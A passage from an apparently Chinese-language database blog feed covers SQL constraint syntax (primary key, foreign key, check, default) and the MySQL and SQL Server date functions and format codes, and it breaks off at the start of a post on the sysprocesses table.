<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL PRIMARY KEY,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 PRIMARY KEY 约束，以及为多个列定义 PRIMARY KEY<br>约束，请使用下面的 SQL 语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT uc_PersonID PRIMARY KEY (Id_P,LastName)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="ALTER-TABLE中的PRIMARY-KEY"><a href="#ALTER-TABLE中的PRIMARY-KEY" class="headerlink" title="ALTER TABLE中的PRIMARY KEY"></a>ALTER TABLE中的PRIMARY KEY</h4><p>如果在表已存在的情况下为 “Id_P” 列创建 PRIMARY KEY 约束，请使用下面的<br>SQL：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD PRIMARY KEY (Id_P)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 PRIMARY KEY 约束，以及为多个列定义 PRIMARY KEY<br>约束，请使用下面的 SQL 语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT pk_PersonID PRIMARY KEY (Id_P,LastName)</span><br></pre></td></tr></table></figure>

<p>注释：如果您使用 ALTER TABLE 语句添加主键，必须把主键列声明为不包含 NULL<br>值（在表首次创建时）。</p>
<h4 id="撤销-PRIMARY-KEY-约束"><a href="#撤销-PRIMARY-KEY-约束" class="headerlink" title="撤销 PRIMARY KEY 约束"></a>撤销 PRIMARY KEY 约束</h4><p>如需撤销 PRIMARY KEY 约束，请使用下面的 SQL：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP PRIMARY KEY</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT pk_PersonID</span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="FOREIGN-KEY-约束"><a href="#FOREIGN-KEY-约束" class="headerlink" title="FOREIGN KEY 约束"></a>FOREIGN KEY 约束</h3><p>一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY。</p>
<p>FOREIGN KEY 约束用于预防破坏表之间连接的动作。</p>
<p>FOREIGN KEY<br>约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。</p>
<h4 id="CREATE-TABLE中的FOREIGN-KEY"><a href="#CREATE-TABLE中的FOREIGN-KEY" class="headerlink" title="CREATE TABLE中的FOREIGN KEY"></a>CREATE TABLE中的FOREIGN KEY</h4><p>下面的 SQL 在 “Orders” 表创建时为 “Id_P” 列创建 FOREIGN KEY：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">Id_P int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">FOREIGN KEY (Id_P) REFERENCES Persons(Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL PRIMARY KEY,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">Id_P int FOREIGN KEY REFERENCES Persons(Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 FOREIGN KEY 约束，以及为多个列定义 FOREIGN KEY<br>约束，请使用下面的 SQL 语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">O_Id int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">Id_P int,</span><br><span class="line">PRIMARY KEY (O_Id),</span><br><span class="line">CONSTRAINT fk_PerOrders FOREIGN KEY (Id_P)</span><br><span class="line">REFERENCES Persons(Id_P)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="ALTER-TABLE中的FOREIGN-KEY"><a href="#ALTER-TABLE中的FOREIGN-KEY" class="headerlink" title="ALTER TABLE中的FOREIGN KEY"></a>ALTER TABLE中的FOREIGN KEY</h4><p>如果在 “Orders” 表已存在的情况下为 “Id_P” 列创建 FOREIGN KEY<br>约束，请使用下面的 SQL：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders</span><br><span class="line">ADD FOREIGN KEY (Id_P)</span><br><span class="line">REFERENCES Persons(Id_P)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 FOREIGN KEY 约束，以及为多个列定义 FOREIGN KEY<br>约束，请使用下面的 SQL 语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders</span><br><span class="line">ADD CONSTRAINT fk_PerOrders</span><br><span class="line">FOREIGN KEY (Id_P)</span><br><span class="line">REFERENCES Persons(Id_P)</span><br></pre></td></tr></table></figure>

<h4 id="撤销-FOREIGN-KEY-约束"><a href="#撤销-FOREIGN-KEY-约束" class="headerlink" title="撤销 FOREIGN KEY 约束"></a>撤销 FOREIGN KEY 约束</h4><p>如需撤销 FOREIGN KEY 约束，请使用下面的 SQL：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders</span><br><span class="line">DROP FOREIGN KEY fk_PerOrders</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Orders</span><br><span class="line">DROP CONSTRAINT fk_PerOrders</span><br></pre></td></tr></table></figure>

<h3 id="CHECK-约束"><a href="#CHECK-约束" class="headerlink" title="CHECK 约束"></a>CHECK 约束</h3><p>CHECK 约束用于限制列中的值的范围。</p>
<p>如果对单个列定义 CHECK 约束，那么该列只允许特定的值。</p>
<p>如果对一个表定义 CHECK 约束，那么此约束会在特定的列中对值进行限制。</p>
<h4 id="CREATE-TABLE中的CHECK"><a href="#CREATE-TABLE中的CHECK" class="headerlink" title="CREATE TABLE中的CHECK"></a>CREATE TABLE中的CHECK</h4><p>下面的 SQL 在 “Persons” 表创建时为 “Id_P” 列创建 CHECK 约束。CHECK<br>约束规定 “Id_P” 列必须只包含大于 0 的整数。</p>
<p>My SQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CHECK (Id_P&gt;0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL CHECK (Id_P&gt;0),</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 CHECK 约束，以及为多个列定义 CHECK 约束，请使用下面的 SQL<br>语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">CONSTRAINT chk_Person CHECK (Id_P&gt;0 AND City=&#x27;Sandnes&#x27;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="ALTER-TABLE中的CHECK"><a href="#ALTER-TABLE中的CHECK" class="headerlink" title="ALTER TABLE中的CHECK"></a>ALTER TABLE中的CHECK</h4><p>如果在表已存在的情况下为 “Id_P” 列创建 CHECK 约束，请使用下面的 SQL：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CHECK (Id_P&gt;0)</span><br></pre></td></tr></table></figure>

<p>如果需要命名 CHECK 约束，以及为多个列定义 CHECK 约束，请使用下面的 SQL<br>语法：</p>
<p>MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ADD CONSTRAINT chk_Person CHECK (Id_P&gt;0 AND City=&#x27;Sandnes&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="撤销-CHECK-约束"><a href="#撤销-CHECK-约束" class="headerlink" title="撤销 CHECK 约束"></a>撤销 CHECK 约束</h4><p>如需撤销 CHECK 约束，请使用下面的 SQL：</p>
<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CONSTRAINT chk_Person</span><br></pre></td></tr></table></figure>

<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">DROP CHECK chk_Person</span><br></pre></td></tr></table></figure>

<h3 id="DEFAULT-约束"><a href="#DEFAULT-约束" class="headerlink" title="DEFAULT 约束"></a>DEFAULT 约束</h3><p>DEFAULT 约束用于向列中插入默认值。</p>
<p>如果没有规定其他的值，那么会将默认值添加到所有的新记录。</p>
<h4 id="CREATE-TABLE中的DEFAULT"><a href="#CREATE-TABLE中的DEFAULT" class="headerlink" title="CREATE TABLE中的DEFAULT"></a>CREATE TABLE中的DEFAULT</h4><p>下面的 SQL 在 “Persons” 表创建时为 “City” 列创建 DEFAULT 约束：</p>
<p>My SQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">Id_P int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255) DEFAULT &#x27;Sandnes&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Orders</span><br><span class="line">(</span><br><span class="line">Id_O int NOT NULL,</span><br><span class="line">OrderNo int NOT NULL,</span><br><span class="line">Id_P int,</span><br><span class="line">OrderDate date DEFAULT GETDATE()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="ALTER-TABLE中的DEFAULT"><a href="#ALTER-TABLE中的DEFAULT" class="headerlink" title="ALTER TABLE中的DEFAULT"></a>ALTER TABLE中的DEFAULT</h4><p>如果在表已存在的情况下为 “City” 列创建 DEFAULT 约束，请使用下面的 SQL：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER City SET DEFAULT &#x27;SANDNES&#x27;</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER COLUMN City SET DEFAULT &#x27;SANDNES&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="撤销-DEFAULT-约束"><a href="#撤销-DEFAULT-约束" class="headerlink" title="撤销 DEFAULT 约束"></a>撤销 DEFAULT 约束</h4><p>如需撤销 DEFAULT 约束，请使用下面的 SQL：</p>
<p>MySQL:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER City DROP DEFAULT</span><br></pre></td></tr></table></figure>

<p>SQL Server &#x2F; Oracle &#x2F; MS Access:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE Persons</span><br><span class="line">ALTER COLUMN City DROP DEFAULT</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL Date 函数详解</title>
    <url>/blog/database/mysql/datehsxj/</url>
    <content><![CDATA[<p>MySQL 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p>
<ul>
<li>DATE – 格式 YYYY-MM-DD</li>
<li>DATETIME – 格式: YYYY-MM-DD HH:MM:SS</li>
<li>TIMESTAMP – 格式: YYYY-MM-DD HH:MM:SS</li>
<li>YEAR – 格式 YYYY 或 YY</li>
</ul>
<p>下面的表格列出了 MySQL 中最重要的内建日期函数：</p>
<p>+———————————–+———————————–+<br>| <strong>函数</strong>                          | <strong>描述</strong>                          |<br>+———————————–+———————————–+<br>| NOW()                             | 返回当前的日期和时间              |<br>+———————————–+———————————–+<br>| CURDATE()                         | 返回当前的日期                    |<br>+———————————–+———————————–+<br>| CURTIME()                         | 返回当前的时间                    |<br>+———————————–+———————————–+<br>| DATE()                            | 提取日期或日期&#x2F;时间表达式的日期部分 |<br>+———————————–+———————————–+<br>| EXTRACT()                         | 返回日期&#x2F;时间按的单独部分         |<br>+———————————–+———————————–+<br>| DATE_ADD()                       | 给日期添加指定的时间间隔          |<br>+———————————–+———————————–+<br>| DATE_SUB()                       | 从日期减去指定的时间间隔          |<br>+———————————–+———————————–+<br>| DATEDIFF()                        | 返回两个日期之间的天数            |<br>+———————————–+———————————–+<br>| DATE_FORMAT()                    | 用不同的格式显示日期&#x2F;时间         |<br>+———————————–+———————————–+</p>
<h3 id="DATE"><a href="#DATE" class="headerlink" title="DATE()"></a>DATE()</h3><p>定义和用法</p>
<p>DATE() 函数返回日期或日期&#x2F;时间表达式的日期部分。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE(date)</span><br></pre></td></tr></table></figure>

<p>date 参数是合法的日期表达式。</p>
<h3 id="EXTRACT"><a href="#EXTRACT" class="headerlink" title="EXTRACT()"></a>EXTRACT()</h3><p>定义和用法</p>
<p>EXTRACT()<br>函数用于返回日期&#x2F;时间的单独部分，比如年、月、日、小时、分钟等等。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACT(unit FROM date)</span><br></pre></td></tr></table></figure>

<p><em>date</em> 参数是合法的日期表达式。</p>
<h3 id="DATE-ADD-和DATE-SUB"><a href="#DATE-ADD-和DATE-SUB" class="headerlink" title="DATE_ADD()和DATE_SUB()"></a>DATE_ADD()和DATE_SUB()</h3><p>定义和用法</p>
<p>DATE_ADD() 函数向日期添加指定的时间间隔。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE_ADD(date,INTERVAL expr type)</span><br><span class="line">DATE_SUB(date,INTERVAL expr type)</span><br></pre></td></tr></table></figure>

<p><em>date</em> 参数是合法的日期表达式。<em>expr</em> 参数是您希望添加的时间间隔。</p>
<h3 id="Unit-和Type的值"><a href="#Unit-和Type的值" class="headerlink" title="Unit 和Type的值"></a>Unit 和Type的值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MICROSECOND</span><br><span class="line">SECOND</span><br><span class="line">MINUTE</span><br><span class="line">HOUR</span><br><span class="line">DAY</span><br><span class="line">WEEK</span><br><span class="line">MONTH</span><br><span class="line">QUARTER</span><br><span class="line">YEAR</span><br><span class="line">SECOND_MICROSECOND</span><br><span class="line">MINUTE_MICROSECOND</span><br><span class="line">MINUTE_SECOND</span><br><span class="line">HOUR_MICROSECOND</span><br><span class="line">HOUR_SECOND</span><br><span class="line">HOUR_MINUTE</span><br><span class="line">DAY_MICROSECOND</span><br><span class="line">DAY_SECOND</span><br><span class="line">DAY_MINUTE</span><br><span class="line">DAY_HOUR</span><br><span class="line">YEAR_MONTH</span><br></pre></td></tr></table></figure>

<h3 id="DATEDIFF"><a href="#DATEDIFF" class="headerlink" title="DATEDIFF()"></a>DATEDIFF()</h3><p>定义和用法</p>
<p>DATEDIFF() 函数返回两个日期之间的天数。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATEDIFF(date1,date2)</span><br></pre></td></tr></table></figure>

<p><em>date1</em> 和 <em>date2</em> 参数是合法的日期或日期&#x2F;时间表达式。</p>
<p>注释：只有值的日期部分参与计算。</p>
<h3 id="DATE-FORMAT"><a href="#DATE-FORMAT" class="headerlink" title="DATE_FORMAT()"></a>DATE_FORMAT()</h3><p>定义和用法</p>
<p>DATE_FORMAT() 函数用于以不同的格式显示日期&#x2F;时间数据。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE_FORMAT(date,format)</span><br></pre></td></tr></table></figure>

<p><em>date</em> 参数是合法的日期。<em>format</em> 规定日期&#x2F;时间的输出格式。</p>
<p>可以使用的格式有：</p>
<p>+———————————–+———————————–+<br>| <strong>格式</strong>                          | <strong>描述</strong>                          |<br>+———————————–+———————————–+<br>| %a                               | 缩写星期名                        |<br>+———————————–+———————————–+<br>| %b                               | 缩写月名                          |<br>+———————————–+———————————–+<br>| %c                               | 月，数值                          |<br>+———————————–+———————————–+<br>| %D                               | 带有英文前缀的月中的天            |<br>+———————————–+———————————–+<br>| %d                               | 月的天，数值(00-31)               |<br>+———————————–+———————————–+<br>| %e                               | 月的天，数值(0-31)                |<br>+———————————–+———————————–+<br>| %f                               | 微秒                              |<br>+———————————–+———————————–+<br>| %H                               | 小时 (00-23)                      |<br>+———————————–+———————————–+<br>| %h                               | 小时 (01-12)                      |<br>+———————————–+———————————–+<br>| %I                               | 小时 (01-12)                      |<br>+———————————–+———————————–+<br>| %i                               | 分钟，数值(00-59)                 |<br>+———————————–+———————————–+<br>| %j                               | 年的天 (001-366)                  |<br>+———————————–+———————————–+<br>| %k                               | 小时 (0-23)                       |<br>+———————————–+———————————–+<br>| %l                               | 小时 (1-12)                       |<br>+———————————–+———————————–+<br>| %M                               | 月名                              |<br>+———————————–+———————————–+<br>| %m                               | 月，数值(00-12)                   |<br>+———————————–+———————————–+<br>| %p                               | AM 或 PM                          |<br>+———————————–+———————————–+<br>| %r                               | 时间，12-小时（hh:mm:ss AM 或     |<br>|                                   | PM）                              |<br>+———————————–+———————————–+<br>| %S                               | 秒(00-59)                         |<br>+———————————–+———————————–+<br>| %s                               | 秒(00-59)                         |<br>+———————————–+———————————–+<br>| %T                               | 时间, 24-小时 (hh:mm:ss)          |<br>+———————————–+———————————–+<br>| %U                               | 周 (00-53) 星期日是一周的第一天   |<br>+———————————–+———————————–+<br>| %u                               | 周 (00-53) 星期一是一周的第一天   |<br>+———————————–+———————————–+<br>| %V                               | 周 (01-53)                        |<br>|                                   | 星期日是一周的第一天，与 %X 使用  |<br>+———————————–+———————————–+<br>| %v                               | 周 (01-53)                        |<br>|                                   | 星期一是一周的第一天，与 %x 使用  |<br>+———————————–+———————————–+<br>| %W                               | 星期名                            |<br>+———————————–+———————————–+<br>| %w                               | 周的天   （0&#x3D;星期日, 6&#x3D;星期六）   |<br>+———————————–+———————————–+<br>| %X                               | 年，其中的星期日是周的第一天，4   |<br>|                                   | 位，与 %V 使用                    |<br>+———————————–+———————————–+<br>| %x                               | 年，其中的星期一是周的第一天，4   |<br>|                                   | 位，与 %v 使用                    |<br>+———————————–+———————————–+<br>| %Y                               | 年，4 位                          |<br>+———————————–+———————————–+<br>| %y                               | 年，2 位                          |<br>+———————————–+———————————–+</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL Server Date 函数</title>
    <url>/blog/database/sqlserver/datehsxj/</url>
    <content><![CDATA[<p>SQL Server 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p>
<ul>
<li>DATE – 格式 YYYY-MM-DD</li>
<li>DATETIME – 格式: YYYY-MM-DD HH:MM:SS</li>
<li>SMALLDATETIME – 格式: YYYY-MM-DD HH:MM:SS</li>
<li>TIMESTAMP – 格式: 唯一的数字</li>
</ul>
<p>下面的表格列出了 SQL Server 中最重要的内建日期函数：</p>
<p>+———————————–+———————————–+<br>| <strong>函数</strong>                          | <strong>描述</strong>                          |<br>+———————————–+———————————–+<br>| GETDATE()                         | 返回当前日期和时间                |<br>+———————————–+———————————–+<br>| DATEPART()                        | 返回日期&#x2F;时间的单独部分           |<br>+———————————–+———————————–+<br>| DATEADD()                         | 在日期中添加或减去指定的时间间隔  |<br>+———————————–+———————————–+<br>| DATEDIFF()                        | 返回两个日期之间的时间            |<br>+———————————–+———————————–+<br>| CONVERT()                         | 用不同的格式显示日期&#x2F;时间         |<br>+———————————–+———————————–+</p>
<h3 id="DATEPART"><a href="#DATEPART" class="headerlink" title="DATEPART()"></a>DATEPART()</h3><p>定义和用法</p>
<p>DATEPART()<br>函数用于返回日期&#x2F;时间的单独部分，比如年、月、日、小时、分钟等等。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATEPART(datepart,date)</span><br></pre></td></tr></table></figure>

<p><em>date</em> 参数是合法的日期表达式。</p>
<h3 id="DATEADD"><a href="#DATEADD" class="headerlink" title="DATEADD()"></a>DATEADD()</h3><p>定义和用法</p>
<p>DATEADD() 函数在日期中添加或减去指定的时间间隔。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATEADD(datepart,number,date)</span><br></pre></td></tr></table></figure>

<p><em>date</em> 参数是合法的日期表达式。<em>number</em><br>是您希望添加的间隔数；对于未来的时间，此数是正数，对于过去的时间，此数是负数。</p>
<h3 id="DATEDIFF"><a href="#DATEDIFF" class="headerlink" title="DATEDIFF()"></a>DATEDIFF()</h3><p>定义和用法</p>
<p>DATEDIFF() 函数返回两个日期之间的天数。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATEDIFF(datepart,startdate,enddate)</span><br></pre></td></tr></table></figure>

<p>startdate 和 enddate 参数是合法的日期表达式。</p>
<h3 id="datepart的值"><a href="#datepart的值" class="headerlink" title="datepart的值"></a>datepart的值</h3><p>+———————————–+———————————–+<br>| <strong>datepart</strong>                      | <strong>缩写</strong>                          |<br>+———————————–+———————————–+<br>| 年                                | yy, yyyy                          |<br>+———————————–+———————————–+<br>| 季度                              | qq, q                             |<br>+———————————–+———————————–+<br>| 月                                | mm, m                             |<br>+———————————–+———————————–+<br>| 年中的日                          | dy, y                             |<br>+———————————–+———————————–+<br>| 日                                | dd, d                             |<br>+———————————–+———————————–+<br>| 周                                | wk, ww                            |<br>+———————————–+———————————–+<br>| 星期                              | dw, w                             |<br>+———————————–+———————————–+<br>| 小时                              | hh                                |<br>+———————————–+———————————–+<br>| 分钟                              | mi, n                             |<br>+———————————–+———————————–+<br>| 秒                                | ss, s                             |<br>+———————————–+———————————–+<br>| 毫秒                              | ms                                |<br>+———————————–+———————————–+<br>| 微妙                              | mcs                               |<br>+———————————–+———————————–+<br>| 纳秒                              | ns                                |<br>+———————————–+———————————–+</p>
<h3 id="CONVERT"><a href="#CONVERT" class="headerlink" title="CONVERT()"></a>CONVERT()</h3><p>定义和用法</p>
<p>CONVERT() 函数是把日期转换为新数据类型的通用函数。</p>
<p>CONVERT() 函数可以用不同的格式显示日期&#x2F;时间数据。</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br></pre></td></tr></table></figure>

<p><em>data_type(length)</em><br>规定目标数据类型（带有可选的长度）。<em>data_to_be_converted</em><br>含有需要转换的值。<em>style</em> 规定日期&#x2F;时间的输出格式。</p>
<p>可以使用的 <em>style</em> 值：</p>
<p>+———————————–+———————————–+<br>| <strong>Style ID</strong>                      | <strong>Style</strong> <strong>格式</strong>                |<br>+———————————–+———————————–+<br>| 100 或者 0                        | mon dd yyyy hh:miAM （或者 PM）   |<br>+———————————–+———————————–+<br>| 101                               | mm&#x2F;dd&#x2F;yy                          |<br>+———————————–+———————————–+<br>| 102                               | yy.mm.dd                          |<br>+———————————–+———————————–+<br>| 103                               | dd&#x2F;mm&#x2F;yy                          |<br>+———————————–+———————————–+<br>| 104                               | dd.mm.yy                          |<br>+———————————–+———————————–+<br>| 105                               | dd-mm-yy                          |<br>+———————————–+———————————–+<br>| 106                               | dd mon yy                         |<br>+———————————–+———————————–+<br>| 107                               | Mon dd, yy                        |<br>+———————————–+———————————–+<br>| 108                               | hh:mm:ss                          |<br>+———————————–+———————————–+<br>| 109 或者 9                        | mon dd yyyy hh:mi:ss:mmmAM（或者  |<br>|                                   | PM）                              |<br>+———————————–+———————————–+<br>| 110                               | mm-dd-yy                          |<br>+———————————–+———————————–+<br>| 111                               | yy&#x2F;mm&#x2F;dd                          |<br>+———————————–+———————————–+<br>| 112                               | yymmdd                            |<br>+———————————–+———————————–+<br>| 113 或者 13                       | dd mon yyyy hh:mm:ss:mmm(24h)     |<br>+———————————–+———————————–+<br>| 114                               | hh:mi:ss:mmm(24h)                 |<br>+———————————–+———————————–+<br>| 120 或者 20                       | yyyy-mm-dd hh:mi:ss(24h)          |<br>+———————————–+———————————–+<br>| 121 或者 21                       | yyyy-mm-dd hh:mi:ss.mmm(24h)      |<br>+———————————–+———————————–+<br>| 126                               | yyyy-mm-ddThh:mm:ss.mmm（没有空格） |<br>+———————————–+———————————–+<br>| 130                               | dd mon yyyy hh:mi:ss:mmmAM        |<br>+———————————–+———————————–+<br>| 131                               | dd&#x2F;mm&#x2F;yy hh:mi:ss:mmmAM           |<br>+———————————–+———————————–+</p>
<p>实例</p>
<p>下面的脚本使用 CONVERT() 函数来显示不同的格式。我们将使用 GETDATE()<br>函数来获得当前的日期&#x2F;时间：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110) </span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br></pre></td></tr></table></figure>

<p>结果类似：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dec 29 2008 11:45 PM</span><br><span class="line">12-29-2008</span><br><span class="line">29 Dec 08</span><br><span class="line">29 Dec 2008 16:25:46.635</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>关于SYSPROCESSES表各字段的作用</title>
    <url>/blog/database/sqlserver/sysprocesses/</url>
    <content><![CDATA[<p>sysprocesses 表中保存关于运行在 Microsoft SQL Server<br>上的进程的信息。这些进程可以是客户端进程或系统进程。sysprocesses<br>只存储在 master 数据库中。</p>
<hr>
